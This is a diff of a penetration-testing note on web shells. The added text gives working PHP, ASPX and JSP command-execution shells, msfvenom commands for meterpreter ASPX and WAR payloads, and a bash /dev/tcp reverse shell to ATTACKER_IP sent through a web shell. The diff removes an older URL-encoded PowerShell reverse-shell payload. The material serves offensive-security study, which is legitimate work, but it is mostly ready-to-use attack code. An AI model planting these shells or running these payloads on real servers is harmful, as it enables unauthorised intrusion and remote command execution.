@@ -1,31 +1,166 @@
 ---
 title: "Web Shells"
 created: 2026-03-11
+updated: 2026-11-16
 type: technique
-tags: [linux, shells, technique, windows]
+tags: [technique, exploitation, shells, web]
 ---
 
-Webshell is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.
-# Useful Commands
+# Web Shells
 
-As PHP is still the most common server side scripting language, let's have a look at some simple code for this.
+A script uploaded to a web server that executes OS commands through HTTP requests. Useful when reverse shells are blocked by firewalls, or as a stepping stone to get one.
 
-we can upload this to a server as a php file in a very basic one line format:
+---
 
-```bash
+## How It Works
+
+1. Find a file upload vulnerability (or writable directory)
+2. Upload a script in the server's language (PHP, ASP, JSP)
+3. Browse to the uploaded file
+4. Pass commands via URL parameters or a form
+5. The server executes them and returns the output in the response
+
+The shell runs as the web server's user (`www-data`, `apache`, `iis apppool\defaultapppool`).
+
+---
+
+## PHP Web Shells
+
+### One-liner
+
+```php
 <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
 ```
 
-This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.
+Usage: `http://target/shell.php?cmd=whoami`
 
-Lets try to inject `ifconfig` command for example like this:
+The `<pre>` tags preserve formatting in the browser. `shell_exec()` runs the command and returns stdout.
 
-![](../Attachments/Pasted%20image%2020231105005705.png)
+### Alternative PHP functions
 
-There are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) -- a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.
+| Function | Difference |
+|----------|-----------|
+| `shell_exec()` | Returns full output as a string |
+| `exec()` | Returns only the last line of output |
+| `system()` | Outputs directly, returns last line |
+| `passthru()` | Outputs raw binary (good for downloading files) |
+| `popen()` | Opens a pipe to the process (no direct output) |
 
-If the target is windows we can use this payload to inject in the URL to get a reverse shell, note that we must change the ip and the port to the attacker machine values:
+If one function is disabled in `php.ini`, try another.
 
-```URL
-powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+### PentestMonkey PHP reverse shell
+
+Full reverse shell (not just command execution) — pre-installed on Kali at `/usr/share/webshells/php/php-reverse-shell.php`.
+
+Edit these two lines before uploading:
+
+```php
+$ip = 'ATTACKER_IP';
+$port = 4444;
 ```
+
+Start a listener (`nc -lvnp 4444`), then browse to the uploaded file. It connects back immediately — no URL parameters needed.
+
+**Linux only** — this script uses `/bin/sh` and Unix sockets. For Windows targets, use a PowerShell or msfvenom-generated web shell instead.
+
+---
+
+## ASP / ASPX Web Shells (IIS / Windows)
+
+### CMD execution (ASPX)
+
+```aspx
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<pre><%
+string cmd = Request["cmd"];
+if (cmd != null) {
+    Process p = new Process();
+    p.StartInfo.FileName = "cmd.exe";
+    p.StartInfo.Arguments = "/c " + cmd;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.StartInfo.UseShellExecute = false;
+    p.Start();
+    Response.Write(p.StandardOutput.ReadToEnd());
+}
+%></pre>
+```
+
+Usage: `http://target/shell.aspx?cmd=whoami`
+
+### Msfvenom ASPX shell
+
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx
+```
+
+---
+
+## JSP Web Shells (Tomcat / Java)
+
+### Basic JSP shell
+
+```jsp
+<%@ page import="java.util.*,java.io.*"%>
+<pre>
+<%
+String cmd = request.getParameter("cmd");
+if (cmd != null) {
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while ((line = br.readLine()) != null) out.println(line);
+}
+%>
+</pre>
+```
+
+Usage: `http://target:8080/shell.jsp?cmd=id`
+
+### WAR deployment (Tomcat Manager)
+
+If you have Tomcat Manager credentials:
+
+```bash
+msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war
+```
+
+Upload through `/manager/html`, then browse to `http://target:8080/shell/` to trigger.
+
+---
+
+## Upgrading to a Full Shell
+
+A web shell is limited — no interactivity, one command at a time, output only through HTTP. Upgrade to a reverse shell as soon as possible:
+
+```bash
+# From a PHP web shell (Linux target)
+http://target/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
+
+# From a web shell (Windows target) — URL-encoded PowerShell reverse shell
+http://target/shell.aspx?cmd=powershell+-e+<base64_encoded_reverse_shell>
+```
+
+URL-encode special characters (`&` → `%26`, space → `+` or `%20`, `>` → `%3e`).
+
+---
+
+## Kali's Built-in Web Shells
+
+```bash
+ls /usr/share/webshells/
+# asp/   aspx/   cfm/   jsp/   laudanum/   perl/   php/
+```
+
+Key files:
+- `php/php-reverse-shell.php` — full reverse shell
+- `php/simple-backdoor.php` — one-liner cmd execution
+- `aspx/cmdasp.aspx` — ASP.NET command shell with HTML form
+- `jsp/cmdjsp.jsp` — JSP command shell
+
+---
+
+## Related Notes
+
+- [[Shells and Listeners]] — catching reverse shells, stabilisation
+- [[Msfvenom]] — generating web payloads (PHP, ASPX, WAR)
